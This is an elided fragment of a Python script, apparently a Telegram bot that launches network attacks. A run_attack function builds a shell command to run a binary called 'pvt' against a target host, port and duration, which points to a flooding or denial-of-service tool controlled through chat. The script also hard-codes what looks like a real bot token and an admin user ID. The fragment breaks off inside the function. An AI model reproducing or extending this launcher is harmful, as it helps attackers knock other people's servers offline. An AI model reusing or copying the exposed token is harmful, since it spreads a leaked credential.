...
bot_token = '7918936160:AAEbmp2BmaWh-SYPo3sUyziRze7dqmHBMUY'  # Replace with your bot token
...
ADMIN_ID = 6073143283  # Replace with the actual admin's user ID
...
def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./pvt {target} {port} {attack_time}"
